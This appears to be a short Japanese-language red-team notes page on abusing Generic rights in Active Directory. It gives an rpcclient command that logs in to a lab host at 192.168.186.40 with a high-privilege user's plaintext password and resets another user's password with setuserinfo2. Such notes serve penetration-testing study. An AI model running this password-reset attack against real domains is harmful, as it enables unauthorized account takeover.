---
title: rpcclient
parent: Active Directory
grand_parent: Red Team
---

# Generic権限を持つ対象の操作
- Hazel高権限
- Molly 低権限グループ
```zsh
rpcclient -N 192.168.186.40 -U 'hazel.green%haze1988'

$> setuserinfo2 MOLLY.SMITH 23 'Password123!'
```